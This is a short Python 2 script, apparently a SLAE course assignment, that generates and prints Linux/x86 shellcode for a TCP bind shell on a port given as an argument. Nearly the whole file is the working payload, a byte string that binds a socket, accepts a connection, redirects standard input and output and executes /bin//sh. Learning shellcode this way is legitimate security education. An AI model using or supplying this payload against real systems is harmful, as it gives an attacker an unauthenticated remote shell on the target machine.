#!/usr/bin/python

# SLAE Assignment #1: TCP Bind Shell Linux/x86 Shellcode Wrapper
# Author: Jason Doyle (@_jasondoyle)

import sys

if len(sys.argv) != 2:
    print "error: need port number"
    exit()
else:
    port = int(sys.argv[1])
    if port > 65535 or port < 1024:
        print "error: port should be between 1024-65535"
        exit()

    hport = '\\x' + ("%0.4X" % port)[0:2] + '\\x' + ("%0.4X" % port)[2:4]
    shellcode = (
       "\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x43\\x31\\xc0\\xb0\\x66"
       "\\xcd\\x80\\x31\\xd2\\x88\\xc2\\x31\\xf6\\x56\\x66\\x68" + hport +
       "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xb0\\x66\\xb3"
       "\\x02\\xcd\\x80\\x56\\x52\\x89\\xe1\\xb0\\x66\\xb3\\x04\\xcd\\x80\\x56"
       "\\x56\\x52\\x89\\xe1\\xb0\\x66\\xb3\\x05\\xcd\\x80\\x31\\xc9\\xb1\\x03"
       "\\x89\\xc3\\x51\\x49\\xb0\\x3f\\xcd\\x80\\x59\\xe2\\xf7\\x56\\x68\\x2f"
       "\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xf1\\x89\\xf2"
       "\\xb0\\x0b\\xcd\\x80"
     )

    print "\nTCP Bind Shell 0.0.0.0:{}\n\n{}\n".format(port, shellcode)
